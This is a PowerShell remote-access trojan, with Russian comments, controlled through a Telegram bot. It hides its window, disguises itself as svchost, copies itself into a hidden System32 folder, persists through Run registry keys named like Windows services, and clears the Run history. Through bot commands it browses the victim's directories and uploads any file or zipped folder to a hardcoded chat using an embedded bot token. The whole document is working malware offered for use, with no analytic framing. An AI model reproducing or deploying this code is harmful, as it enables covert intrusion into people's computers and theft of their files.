# RAT —á–µ—Ä–µ–∑ Telegram Bot - –ò–°–ü–†–ê–í–õ–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø –ë–ï–ó –î–ò–ê–õ–û–ì–û–í
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–æ–¥–∏—Ä–æ–≤–∫–∏ UTF-8 –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ä—É—Å—Å–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# –°–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞ PowerShell —á–µ—Ä–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–∞ –æ–∫–Ω–∞
$windowCode = @"
using System;
using System.Runtime.InteropServices;
public class WindowHider {
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern int SetWindowText(IntPtr hWnd, string text);
}
"@
Add-Type -TypeDefinition $windowCode
$consolePtr = [WindowHider]::GetConsoleWindow()
[WindowHider]::ShowWindow($consolePtr, 0) | Out-Null
[WindowHider]::SetWindowText($consolePtr, "svchost") | Out-Null

# –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á
try {
    $process = Get-Process -Id $pid
    $process.ProcessName = "svchost"
} catch { }

# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π —Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∫–æ–¥–∏—Ä–æ–≤–∫–æ–π
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —Å —Ñ–æ—Ä–º–æ–π
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–æ–≤ - –ü–û–õ–ù–û–°–¢–¨–Æ –ü–ï–†–ï–ü–ò–°–ê–ù–ê
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º WebClient –¥–ª—è –∏–∑–±–µ–∂–∞–Ω–∏—è –¥–∏–∞–ª–æ–≥–æ–≤
        $webClient = New-Object System.Net.WebClient
        
        # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª —Å —É–Ω–∏–∫–∞–ª—å–Ω—ã–º –∏–º–µ–Ω–µ–º
        $tempDir = "$env:TEMP\TelegramUpload_$(Get-Random)"
        New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
        attrib +s +h "$tempDir" 2>&1 | Out-Null
        
        $originalName = Split-Path $FilePath -Leaf
        $tempFilePath = Join-Path $tempDir $originalName
        
        # –ö–æ–ø–∏—Ä—É–µ–º —Ñ–∞–π–ª —Å –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ–π –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å—é
        Copy-Item $FilePath $tempFilePath -Force
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º multipart –∑–∞–ø—Ä–æ—Å –≤—Ä—É—á–Ω—É—é
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($tempFilePath)
        $encoding = [System.Text.Encoding]::GetEncoding("iso-8859-1")
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞
        $bodyBuilder = New-Object System.Text.StringBuilder
        
        # –î–æ–±–∞–≤–ª—è–µ–º chat_id
        $bodyBuilder.AppendLine("--$boundary") | Out-Null
        $bodyBuilder.AppendLine('Content-Disposition: form-data; name="chat_id"') | Out-Null
        $bodyBuilder.AppendLine() | Out-Null
        $bodyBuilder.AppendLine($ChatID) | Out-Null
        
        # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–∞–π–ª
        $bodyBuilder.AppendLine("--$boundary") | Out-Null
        $bodyBuilder.AppendLine("Content-Disposition: form-data; name=`"document`"; filename=`"$originalName`"") | Out-Null
        $bodyBuilder.AppendLine("Content-Type: application/octet-stream") | Out-Null
        $bodyBuilder.AppendLine() | Out-Null
        
        $bodyBytes = $encoding.GetBytes($bodyBuilder.ToString())
        
        # –°–æ–∑–¥–∞–µ–º –∫–æ–Ω–µ—á–Ω—ã–π –º–∞—Å—Å–∏–≤ –±–∞–π—Ç–æ–≤
        $endLine = $encoding.GetBytes("`r`n--$boundary--`r`n")
        $finalBytes = $bodyBytes + $fileBytes + $endLine
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $response = $webClient.UploadData($url, "POST", $finalBytes)
        
        # –û—á–∏—â–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã
        Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue
        Remove-Item $tempDir -Force -ErrorAction SilentlyContinue
        $webClient.Dispose()
        
        return $true
        
    } catch {
        try {
            # –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥ - –∏—Å–ø–æ–ª—å–∑—É–µ–º Invoke-RestMethod —Å MemoryStream
            $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
            $fileStream = New-Object System.IO.MemoryStream(,$fileContent)
            
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
            $fileStream.Dispose()
            return $true
        } catch {
            return $false
        }
    }
}

# –§—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è ZIP –∞—Ä—Ö–∏–≤–∞
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# –§—É–Ω–∫—Ü–∏—è –æ—á–∏—Å—Ç–∫–∏ RAT (–∏–Ω—Ç–µ–≥—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π cleanup.ps1)
function Invoke-Cleanup {
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª–æ –æ—á–∏—Å—Ç–∫–∏
    Send-Telegram "üîç –ù–∞—á–∏–Ω–∞–µ—Ç—Å—è –ø–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ RAT..."

    # 1. –ó–∞–≤–µ—Ä—à–∞–µ–º –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã RAT
    Send-Telegram "üîÑ –≠—Ç–∞–ø 1: –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ RAT"

    $processes = Get-Process | Where-Object {
        $_.ProcessName -eq "powershell" -or 
        $_.ProcessName -eq "pwsh" -or
        $_.ProcessName -eq "cmd"
    }

    foreach ($process in $processes) {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*System32Logs*" -or $cmdLine -like "*8429674512*") {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    # 2. –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª—ã RAT
    Send-Telegram "üîÑ –≠—Ç–∞–ø 2: –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ RAT"

    $filesToDelete = @(
        "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
        "$env:TEMP\WindowsSystem.exe",
        "$env:TEMP\cleanup_*.ps1",
        "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
        "$env:TEMP\rat_installed.marker",
        "$env:WINDIR\System32\System32Logs\svchost.exe",
        "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted\windows_update.marker",
        "$env:TEMP\TelegramUpload_*"
    )

    $deletedFiles = @()
    foreach ($filePattern in $filesToDelete) {
        try {
            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue -Recurse
                $deletedFiles += $_.FullName
            }
        } catch { }
    }

    # 3. –û—á–∏—â–∞–µ–º –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —Ä–µ–µ—Å—Ç—Ä–∞
    Send-Telegram "üîÑ –≠—Ç–∞–ø 3: –û—á–∏—Å—Ç–∫–∞ —Ä–µ–µ—Å—Ç—Ä–∞"

    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            $value1 = Get-ItemProperty -Path $regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
            if ($value1) {
                Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Defender Security"
            }
            
            $value2 = Get-ItemProperty -Path $regPath -Name "Windows Audio Service" -ErrorAction SilentlyContinue
            if ($value2) {
                Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Audio Service"
            }
            
            $value3 = Get-ItemProperty -Path $regPath -Name "System32 Logs Service" -ErrorAction SilentlyContinue
            if ($value3) {
                Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\System32 Logs Service"
            }
        } catch { }
    }

    # 4. –û—á–∏—â–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é RUN
    Send-Telegram "üîÑ –≠—Ç–∞–ø 4: –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    # 5. –§–∏–Ω–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
    $report = @"
‚úÖ –û–ß–ò–°–¢–ö–ê RAT –ó–ê–í–ï–†–®–ï–ù–ê

–£–¥–∞–ª–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:
$($deletedFiles -join "`n")

–£–¥–∞–ª–µ–Ω–Ω—ã–µ –∑–∞–ø–∏—Å–∏ —Ä–µ–µ—Å—Ç—Ä–∞:
$($regEntries -join "`n")

–í—Å–µ —Å–ª–µ–¥—ã RAT —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã.
"@

    Send-Telegram $report
    return $true
}

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –º–∞—Å–∫–∏—Ä–æ–≤–∫–æ–π
$installMarkerDir = "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted"
if (!(Test-Path $installMarkerDir)) {
    New-Item -Path $installMarkerDir -ItemType Directory -Force | Out-Null
    attrib +s +h +r "$installMarkerDir" 2>&1 | Out-Null
}
$installMarker = "$installMarkerDir\windows_update.marker"

# –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ª–∏ —É–∂–µ RAT
if (!(Test-Path $installMarker)) {
    # –°–æ–∑–¥–∞–µ–º –º–∞—Ä–∫–µ—Ä —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Å –±–µ–∑–æ–±–∏–¥–Ω—ã–º –∏–º–µ–Ω–µ–º
    "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
    attrib +s +h +r "$installMarker" 2>&1 | Out-Null
    
    # –ù–æ–≤–∞—è —Å–∫—Ä—ã—Ç–∞—è –ø–∞–ø–∫–∞ –≤ —Å–∏—Å—Ç–µ–º–Ω–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
    $hiddenFolder = "$env:WINDIR\System32\System32Logs"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        # –°–∫—Ä—ã–≤–∞–µ–º –ø–∞–ø–∫—É —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏
        attrib +s +h +r "$hiddenFolder" 2>&1 | Out-Null
    }
    
    $scriptPath = "$hiddenFolder\svchost.exe"
    
    # –ö–æ–ø–∏—Ä—É–µ–º —Å–∫—Ä–∏–ø—Ç —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –µ–≥–æ —Ç–∞–º –Ω–µ—Ç
    if (!(Test-Path $scriptPath)) {
        $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
        $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–∫—Ä—ã—Ç—ã–µ –∞—Ç—Ä–∏–±—É—Ç—ã –Ω–∞ —Ñ–∞–π–ª
        attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
    }
    
    # –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —Å –Ω–æ–≤—ã–º –º–∞—Å–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –∏–º–µ–Ω–µ–º
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    
    # –ù–æ–≤–æ–µ –º–∞—Å–∫–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –∏–º—è –¥–ª—è —Ä–µ–µ—Å—Ç—Ä–∞
    $uniqueName = "System32 Logs Service"
    Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    
    # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤ –¥—Ä—É–≥—É—é –≤–µ—Ç–∫—É —Ä–µ–µ—Å—Ç—Ä–∞ –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
    $regPath2 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    try {
        if (!(Test-Path $regPath2)) { New-Item -Path $regPath2 -Force | Out-Null }
        Set-ItemProperty -Path $regPath2 -Name "Windows System Logs" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# –û—Å–Ω–æ–≤–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
try {
    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
} catch { }

# –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∑–∞–ø—É—Å–∫–µ
Send-Telegram "RAT –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –Ω–∞ $env:COMPUTERNAME
–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
/destroy - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ"

# –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –æ–ø—Ä–æ—Å–∞
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - –ø–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –ø–∞–ø–∫—É
/destroy - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "–°–æ–¥–µ—Ä–∂–∏–º–æ–µ $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: $newDir"
                                    continue
                                }
                            }
                            
                            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –Ω–æ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —Å –ø–æ–º–æ—â—å—é /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                Send-Telegram "‚è≥ –ù–∞—á–∏–Ω–∞—é –æ—Ç–ø—Ä–∞–≤–∫—É —Ñ–∞–π–ª–∞: $target"
                                
                                if (Test-Path $fullPath -PathType Container) {
                                    # –ê—Ä—Ö–∏–≤–∏—Ä—É–µ–º –ø–∞–ø–∫—É
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        $result = Send-TelegramFile -FilePath $zipPath
                                        if ($result) {
                                            Send-Telegram "‚úÖ –ü–∞–ø–∫–∞ $target —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞"
                                        } else {
                                            Send-Telegram "‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–∞–ø–∫–∏: $target"
                                        }
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "‚ùå –û—à–∏–±–∫–∞ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ –ø–∞–ø–∫–∏: $target"
                                    }
                                } else {
                                    $result = Send-TelegramFile -FilePath $fullPath
                                    if ($result) {
                                        Send-Telegram "‚úÖ –§–∞–π–ª $target —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω"
                                    } else {
                                        Send-Telegram "‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–∞: $target"
                                    }
                                }
                            } else {
                                Send-Telegram "‚ùå –§–∞–π–ª/–ø–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "üîÑ –ó–∞–ø—É—Å–∫ –ø—Ä–æ—Ü–µ–¥—É—Ä—ã —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è..."
                            
                            try {
                                # –ó–∞–ø—É—Å–∫–∞–µ–º –≤—Å—Ç—Ä–æ–µ–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –æ—á–∏—Å—Ç–∫–∏
                                $cleanupResult = Invoke-Cleanup
                                
                                if ($cleanupResult) {
                                    # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –æ—Ç–ø—Ä–∞–≤–∫—É —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
                                    Start-Sleep -Seconds 3
                                    
                                    # –ó–∞–≤–µ—Ä—à–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å
                                    Stop-Process -Id $pid -Force
                                }
                                
                            } catch {
                                Send-Telegram "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–∏: $($_.Exception.Message)"
                                
                                # –ê–≤–∞—Ä–∏–π–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id $pid -Force
                                } catch {
                                    cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
